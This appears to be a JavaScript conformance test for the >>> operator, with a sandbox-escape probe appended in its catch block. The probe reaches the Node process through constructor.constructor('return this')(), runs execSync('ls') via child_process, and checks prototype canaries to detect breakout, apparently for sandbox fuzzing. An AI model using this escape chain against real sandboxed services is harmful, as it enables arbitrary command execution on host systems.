try {
    if (true >>> 1 !== 0) {
        $ERROR('#1: true >>> 1 === 0. Actual: ' + (true >>> 1));
    }
    if (1 >>> true !== 0) {
        $ERROR('#2: 1 >>> true === 0. Actual: ' + (1 >>> true));
    }
    if (new Boolean(true) >>> 1 !== 0) {
        $ERROR('#3: new Boolean(true) >>> 1 === 0. Actual: ' + (new Boolean(true) >>> 1));
    }
    if (1 >>> new Boolean(true) !== 0) {
        $ERROR('#4: 1 >>> new Boolean(true) === 0. Actual: ' + (1 >>> new Boolean(true)));
    }
    if (true >>> new Number(1) !== 0) {
        $ERROR('#5: true >>> new Number(1) === 0. Actual: ' + (true >>> new Number(1)));
    }
    if (new Number(1) >>> true !== 0) {
        $ERROR('#6: new Number(1) >>> true === 0. Actual: ' + (new Number(1) >>> true));
    }
    if (new Boolean(true) >>> new Number(1) !== 0) {
        $ERROR('#7: new Boolean(true) >>> new Number(1) === 0. Actual: ' + (new Boolean(true) >>> new Number(1)));
    }
    if (new Number(1) >>> new Boolean(true) !== 0) {
        $ERROR('#8: new Number(1) >>> new Boolean(true) === 0. Actual: ' + (new Number(1) >>> new Boolean(true)));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}